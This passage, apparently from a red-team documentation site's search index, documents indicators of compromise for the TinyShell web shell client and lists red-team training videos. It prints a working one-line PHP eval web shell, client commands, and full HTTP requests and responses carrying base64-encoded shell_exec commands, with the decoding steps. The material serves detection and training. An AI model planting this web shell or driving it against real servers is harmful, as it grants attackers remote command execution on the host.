https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html ) The following are some of the indicators generated by TinyShell. Post Mode \u00b6 TinyShell operating in the Base64 HTTP Post Mode using PHP. Commands are sent via a HTTP POST request. Shell \u00b6 1 <?php @ eval ( base64_decode ( $_POST [ 'token' ])); ?> Note The \"password\" is set to token. This can be changed to any value. It is referenced as \"--password=\" by the TinyShell client. Client Command \u00b6 1 python tinyshell . py --url http://10.203.63.80/upload/uploads/tinyshell.php --password=token --mode=base64_post --language=PHP HTTP Request Sent by Client \u00b6 1 2 3 4 5 6 7 8 9 10 POST /upload/uploads/tinyshell.php HTTP / 1.1 Host : 10.203.63.80 Connection : keep-alive Accept-Encoding : gzip, deflate Accept : */* User-Agent : Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0) Content-Length : 216 Content-Type : application/x-www-form-urlencoded token=ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdaR2x5SUdNNlhIaGhiWEJ3WEdoMFpHOWpjMXh3YjNKMFlXeGZORGhjZFhCc2IyRmtYSFZ3Ykc5aFpITT0nKSAuICIgMj4mMSIpKSAuICIgOlRPS0VOX0NTUkYiKTs%3D HTTP Response \u00b6 1 2 3 4 5 6 7 8 9 10 HTTP / 1 . 1 200 OK Date : Wed , 13 Dec 2017 20 : 45 : 25 GMT Server : Apache / 2 . 4 . 16 ( Win32 ) OpenSSL / 1 . 0 . 1 p PHP / 5 . 5 . 28 X - Powered - By : PHP / 5 . 5 . 28 Content - Length : 504 Keep - Alive : timeout = 5 , max = 100 Connection : Keep - Alive Content - Type : text / html CSRF_TOKEN : IFZvbHVtZSBpbiBkcml2ZSBDIGhhcyBubyBsYWJlbC4KIFZvbHVtZSBTZXJpYWwgTnVtYmVyIGlzIDRFNjEtM0YzMQoKIERpcmVjdG9yeSBvZiBjOlx4YW1wcFxodGRvY3NccG9ydGFsXzQ4XHVwbG9hZFx1cGxvYWRzCgoxMi8xMy8yMDE3ICAwODo0MyBQTSAgICA8RElSPiAgICAgICAgICAuCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgIDxESVI + ICAgICAgICAgIC4uCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgICAgICAgICAgICAgIDQ2IHRpbnlzaGVsbC5waHAKICAgICAgICAgICAgICAgMSBGaWxlKHMpICAgICAgICAgICAgIDQ2IGJ5dGVzCiAgICAgICAgICAgICAgIDIgRGlyKHMpICAxOSwwMDksNDQ5LDk4NCBieXRlcyBmcmVlCg == : TOKEN_CSRF Note This is a standalone copy of TinyShell. If this was added to an existing file, the response would contain the HTML of the source page. The terms \"CSRF_TOKEN:\" and \":TOKEN_CSRF\" are headers and footers that wrap the encoded response. These values are adjustable. Decoding the Payload \u00b6 Base64 Payload ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdaR2x5SUdNNlhIaGhiWEJ3WEdoMFpHOWpjMXh3YjNKMFlXeGZORGhjZFhCc2IyRmtYSFZ3Ykc5aFpITT0nKSAuICIgMj4mMSIpKSAuICIgOlRPS0VOX0NTUkYiKTs = Decode Step 1 echo ( \"CSRF_TOKEN: \" . base64_encode ( shell_exec ( base64_decode ( 'ZGlyIGM6XHhhbXBwXGh0ZG9jc1xwb3J0YWxfNDhcdXBsb2FkXHVwbG9hZHM=' ) . \" 2>&1\" )) . \" :TOKEN_CSRF\" ); Decode Step 2 1 dir c : \\ xampp \\ htdocs \\ portal_48 \\ upload \\ uploads Note This is the command set to the TinyShell web shell. Decoding the Response \u00b6 Encoded Response IFZvbHVtZSBpbiBkcml2ZSBDIGhhcyBubyBsYWJlbC4KIFZvbHVtZSBTZXJpYWwgTnVtYmVyIGlzIDRFNjEtM0YzMQoKIERpcmVjdG9yeSBvZiBjOlx4YW1wcFxodGRvY3NccG9ydGFsXzQ4XHVwbG9hZFx1cGxvYWRzCgoxMi8xMy8yMDE3ICAwODo0MyBQTSAgICA8RElSPiAgICAgICAgICAuCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgIDxESVI + ICAgICAgICAgIC4uCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgICAgICAgICAgICAgIDQ2IHRpbnlzaGVsbC5waHAKICAgICAgICAgICAgICAgMSBGaWxlKHMpICAgICAgICAgICAgIDQ2IGJ5dGVzCiAgICAgICAgICAgICAgIDIgRGlyKHMpICAxOSwwMDksNDQ5LDk4NCBieXRlcyBmcmVlCg == Decoded Response Note This is the response rendered in the TinyShell console. Header Mode \u00b6 TinyShell operating in the Base64 HTTP Header Mode using PHP. Commands are sent via a HTTP HEADE. Shell \u00b6 Note The \"password\" is set to \"PSESSION\". This can be changed to any value. It is referenced as \"--password=\" by the TinyShell client. Client Command \u00b6 1 python tinyshell . py --url=http://10.203.63.80/upload/uploads/tinyshell.php--language=php --password=psession --mode=base64_header HTTP Request Sent by Client \u00b6 1 2 3 4 5 6 7 8 POST /upload/uploads/tinyshell.php HTTP / 1.1 Host : 10.203.63.80 Connection : keep-alive Accept-Encoding : gzip, deflate Accept : */* User-Agent : Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0) psession : ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdZMlE9JykgLiAiIDI+JjEiKSkgLiAiIDpUT0tFTl9DU1JGIik7 Content-Length : 0 HTTP Response \u00b6 1 2 3 4 5 6 7 8 9 10 HTTP / 1 . 1 200 OK Date : Thu , 14 Dec 2017 02 : 46 : 56 GMT Server : Apache / 2 . 4 . 16 ( Win32 ) OpenSSL / 1 . 0 . 1 p PHP / 5 . 5 . 28 X - Powered - By : PHP / 5 . 5 . 28 Content - Length : 80 Keep - Alive : timeout = 5 , max = 100 Connection : Keep - Alive Content - Type : text / html CSRF_TOKEN : QzpceGFtcHBcaHRkb2NzXHBvcnRhbF80OFx1cGxvYWRcdXBsb2Fkcwo = : TOKEN_CSRFPOST / upload / uploads / tinyshell . php Decoding the Payload \u00b6 Base64 Payload ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdZMlE9JykgLiAiIDI + JjEiKSkgLiAiIDpUT0tFTl9DU1JGIik7 Decode Step 1 echo ( \"CSRF_TOKEN: \" . base64_encode ( shell_exec ( base64_decode ( 'Y2Q=' ) . \" 2>&1\" )) . \" :TOKEN_CSRF\" ); Decode Step 2 cd Decoding the Response \u00b6 Encoded Response QzpceGFtcHBcaHRkb2NzXHBvcnRhbF80OFx1cGxvYWRcdXBsb2Fkcwo = Decoded Response C : \\ xampp \\ htdocs \\ portal_48 \\ upload \\ uploads Note This is the response rendered in the TinyShell console.","title":"TinyShell IOCs"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#tinyshell-iocs","text":"TinyShell is a python command shell used to control and excute commands through HTTP requests to a webshell. TinyShell acts as the interface to the remote webshells. TinyShell is based on it's companion project SubShell ( https://github.com/minisllc/subshell ) and the China Chopper Webshell ( https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html ) The following are some of the indicators generated by TinyShell.","title":"TinyShell IOCs"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#post-mode","text":"TinyShell operating in the Base64 HTTP Post Mode using PHP. Commands are sent via a HTTP POST request.","title":"Post Mode"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#shell","text":"1 <?php @ eval ( base64_decode ( $_POST [ 'token' ])); ?> Note The \"password\" is set to token. This can be changed to any value. It is referenced as \"--password=\" by the TinyShell client.","title":"Shell"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#client-command","text":"1 python tinyshell . py --url http://10.203.63.80/upload/uploads/tinyshell.php --password=token --mode=base64_post --language=PHP","title":"Client Command"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#http-request-sent-by-client","text":"1 2 3 4 5 6 7 8 9 10 POST /upload/uploads/tinyshell.php HTTP / 1.1 Host : 10.203.63.80 Connection : keep-alive Accept-Encoding : gzip, deflate Accept : */* User-Agent : Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0) Content-Length : 216 Content-Type : application/x-www-form-urlencoded token=ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdaR2x5SUdNNlhIaGhiWEJ3WEdoMFpHOWpjMXh3YjNKMFlXeGZORGhjZFhCc2IyRmtYSFZ3Ykc5aFpITT0nKSAuICIgMj4mMSIpKSAuICIgOlRPS0VOX0NTUkYiKTs%3D","title":"HTTP Request Sent by Client"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#http-response","text":"1 2 3 4 5 6 7 8 9 10 HTTP / 1 . 1 200 OK Date : Wed , 13 Dec 2017 20 : 45 : 25 GMT Server : Apache / 2 . 4 . 16 ( Win32 ) OpenSSL / 1 . 0 . 1 p PHP / 5 . 5 . 28 X - Powered - By : PHP / 5 . 5 . 28 Content - Length : 504 Keep - Alive : timeout = 5 , max = 100 Connection : Keep - Alive Content - Type : text / html CSRF_TOKEN : IFZvbHVtZSBpbiBkcml2ZSBDIGhhcyBubyBsYWJlbC4KIFZvbHVtZSBTZXJpYWwgTnVtYmVyIGlzIDRFNjEtM0YzMQoKIERpcmVjdG9yeSBvZiBjOlx4YW1wcFxodGRvY3NccG9ydGFsXzQ4XHVwbG9hZFx1cGxvYWRzCgoxMi8xMy8yMDE3ICAwODo0MyBQTSAgICA8RElSPiAgICAgICAgICAuCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgIDxESVI + ICAgICAgICAgIC4uCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgICAgICAgICAgICAgIDQ2IHRpbnlzaGVsbC5waHAKICAgICAgICAgICAgICAgMSBGaWxlKHMpICAgICAgICAgICAgIDQ2IGJ5dGVzCiAgICAgICAgICAgICAgIDIgRGlyKHMpICAxOSwwMDksNDQ5LDk4NCBieXRlcyBmcmVlCg == : TOKEN_CSRF Note This is a standalone copy of TinyShell. If this was added to an existing file, the response would contain the HTML of the source page. The terms \"CSRF_TOKEN:\" and \":TOKEN_CSRF\" are headers and footers that wrap the encoded response. These values are adjustable.","title":"HTTP Response"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#decoding-the-payload","text":"Base64 Payload ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdaR2x5SUdNNlhIaGhiWEJ3WEdoMFpHOWpjMXh3YjNKMFlXeGZORGhjZFhCc2IyRmtYSFZ3Ykc5aFpITT0nKSAuICIgMj4mMSIpKSAuICIgOlRPS0VOX0NTUkYiKTs = Decode Step 1 echo ( \"CSRF_TOKEN: \" . base64_encode ( shell_exec ( base64_decode ( 'ZGlyIGM6XHhhbXBwXGh0ZG9jc1xwb3J0YWxfNDhcdXBsb2FkXHVwbG9hZHM=' ) . \" 2>&1\" )) . \" :TOKEN_CSRF\" ); Decode Step 2 1 dir c : \\ xampp \\ htdocs \\ portal_48 \\ upload \\ uploads Note This is the command set to the TinyShell web shell.","title":"Decoding the Payload"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#decoding-the-response","text":"Encoded Response IFZvbHVtZSBpbiBkcml2ZSBDIGhhcyBubyBsYWJlbC4KIFZvbHVtZSBTZXJpYWwgTnVtYmVyIGlzIDRFNjEtM0YzMQoKIERpcmVjdG9yeSBvZiBjOlx4YW1wcFxodGRvY3NccG9ydGFsXzQ4XHVwbG9hZFx1cGxvYWRzCgoxMi8xMy8yMDE3ICAwODo0MyBQTSAgICA8RElSPiAgICAgICAgICAuCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgIDxESVI + ICAgICAgICAgIC4uCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgICAgICAgICAgICAgIDQ2IHRpbnlzaGVsbC5waHAKICAgICAgICAgICAgICAgMSBGaWxlKHMpICAgICAgICAgICAgIDQ2IGJ5dGVzCiAgICAgICAgICAgICAgIDIgRGlyKHMpICAxOSwwMDksNDQ5LDk4NCBieXRlcyBmcmVlCg == Decoded Response Note This is the response rendered in the TinyShell console.","title":"Decoding the Response"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#header-mode","text":"TinyShell operating in the Base64 HTTP Header Mode using PHP. Commands are sent via a HTTP HEADE.","title":"Header Mode"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#shell_1","text":"Note The \"password\" is set to \"PSESSION\". This can be changed to any value. It is referenced as \"--password=\" by the TinyShell client.","title":"Shell"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#client-command_1","text":"1 python tinyshell . py --url=http://10.203.63.80/upload/uploads/tinyshell.php--language=php --password=psession --mode=base64_header","title":"Client Command"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#http-request-sent-by-client_1","text":"1 2 3 4 5 6 7 8 POST /upload/uploads/tinyshell.php HTTP / 1.1 Host : 10.203.63.80 Connection : keep-alive Accept-Encoding : gzip, deflate Accept : */* User-Agent : Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0) psession : ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdZMlE9JykgLiAiIDI+JjEiKSkgLiAiIDpUT0tFTl9DU1JGIik7 Content-Length : 0","title":"HTTP Request Sent by Client"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#http-response_1","text":"1 2 3 4 5 6 7 8 9 10 HTTP / 1 . 1 200 OK Date : Thu , 14 Dec 2017 02 : 46 : 56 GMT Server : Apache / 2 . 4 . 16 ( Win32 ) OpenSSL / 1 . 0 . 1 p PHP / 5 . 5 . 28 X - Powered - By : PHP / 5 . 5 . 28 Content - Length : 80 Keep - Alive : timeout = 5 , max = 100 Connection : Keep - Alive Content - Type : text / html CSRF_TOKEN : QzpceGFtcHBcaHRkb2NzXHBvcnRhbF80OFx1cGxvYWRcdXBsb2Fkcwo = : TOKEN_CSRFPOST / upload / uploads / tinyshell . php","title":"HTTP Response"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#decoding-the-payload_1","text":"Base64 Payload ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdZMlE9JykgLiAiIDI + JjEiKSkgLiAiIDpUT0tFTl9DU1JGIik7 Decode Step 1 echo ( \"CSRF_TOKEN: \" . base64_encode ( shell_exec ( base64_decode ( 'Y2Q=' ) . \" 2>&1\" )) . \" :TOKEN_CSRF\" ); Decode Step 2 cd","title":"Decoding the Payload"},{"location":"redteaming/tool_ioc/tinyshell_ioc/#decoding-the-response_1","text":"Encoded Response QzpceGFtcHBcaHRkb2NzXHBvcnRhbF80OFx1cGxvYWRcdXBsb2Fkcwo = Decoded Response C : \\ xampp \\ htdocs \\ portal_48 \\ upload \\ uploads Note This is the response rendered in the TinyShell console.","title":"Decoding the Response"},{"location":"redteaming/videos/videos/","text":"Red Team Related Videos \u00b6 OISF - Planning & Executing A Red Team Engagement (2018) \u00b6 Author Tim Wright Description Overview of Red Teaming presented at OISF. URL https://www.youtube.com/watch?v=QCiabLJf_UA In Memory Evasion (2018) \u00b6 Author Raphael Mudge Description In-memory Evasion is a four-part mini course on the cat and mouse game related to memory detections. This course is for red teams that want to update their tradecraft in this area. It\u2019s also for blue teams that want to understand the red perspective on these techniques. Why do they work in some situations? How is it possible to work around these heuristics in other cases? Playlist - https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK Advanced Threat Tactics (2015) \u00b6 Author Raphael Mudge Description Advanced Threat Tactics is a course on Adversary Simulations and Red Team Operations. Learn how to get a foothold in a modern enterprise with a targeted spear phishing attack, log keystrokes and grab screenshots at scale, elevate privileges, take over an Active Directory domain, and tunnel tools and attacks through compromised systems. This course also covers core topics such as infrastructure for attacks, team operations, evasion, and how to disguise your attacks to look like other actors. Playlist - https://www.youtube.com/playlist?list=PL9HO6M_MU2nf8Fa5bVefBW-9bg5Rx94_c How to Use Atomic Red Team Tests (2017) \u00b6 Author Red Canary Description Atomic Red Team is an open-source testing framework mapped to the MITRE ATT&CK Framework. It enables defenders to test their detections against a broad spectrum of attacks. URL https://www.youtube.com/watch?v=iNl_rltYmoo MITRE's ATT&CK Framework (2018) \u00b6 Author MitreCorp Description MITRE ATT&CK\u2122 is a knowledge base that helps model cyber adversaries' tactics and techniques \u2013 and then shows how to detect or stop them. URL https://www.youtube.com/watch?v=0BEf6s1iu5g","title":"Red Team Videos"},{"location":"redteaming/videos/videos/#red-team-related-videos","text":"","title":"Red Team Related Videos"},{"location":"redteaming/videos/videos/#oisf-planning-executing-a-red-team-engagement-2018","text":"Author Tim Wright Description Overview of Red Teaming presented at OISF. URL https://www.youtube.com/watch?v=QCiabLJf_UA","title":"OISF - Planning &amp; Executing A Red Team Engagement (2018)"},{"location":"redteaming/videos/videos/#in-memory-evasion-2018","text":"Author Raphael Mudge Description In-memory Evasion is a four-part mini course on the cat and mouse game related to memory detections. This course is for red teams that want to update their tradecraft in this area. It\u2019s also for blue teams that want to understand the red perspective on these techniques. Why do they work in some situations? How is it possible to work around these heuristics in other cases? Playlist - https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK","title":"In Memory Evasion (2018)"},{"location":"redteaming/videos/videos/#advanced-threat-tactics-2015","text":"Author Raphael Mudge Description Advanced Threat Tactics is a course on Adversary Simulations and Red Team Operations. Learn how to get a foothold in a modern enterprise with a targeted spear phishing attack, log keystrokes and grab screenshots at scale, elevate privileges, take over an Active Directory domain, and tunnel tools and attacks through compromised systems. This course also covers core topics such as infrastructure for attacks, team operations, evasion, and how to disguise your attacks to look like other actors. Playlist - https://www.youtube.com/playlist?list=PL9HO6M_MU2nf8Fa5bVefBW-9bg5Rx94_c","title":"Advanced Threat Tactics (2015)"},{"location":"redteaming/videos/videos/#how-to-use-atomic-red-team-tests-2017","text":"Author Red Canary Description Atomic Red Team is an open-source testing framework mapped to the MITRE ATT&CK Framework. It enables defenders to test their detections against a broad spectrum of attacks. URL https://www.youtube.com/watch?v=iNl_rltYmoo","title":"How to Use Atomic Red Team Tests (2017)"},{"location":"redteaming/videos/videos/#mitres-attck-framework-2018","text":"Author MitreCorp Description MITRE ATT&CK\u2122 is a knowledge base that helps model cyber adversaries' tactics and techniques \u2013 and then shows how to detect or stop them. URL https://www.youtube.com/watch?v=0BEf6s1iu5g","title":"MITRE's ATT&amp;CK Framework (2018)"}]}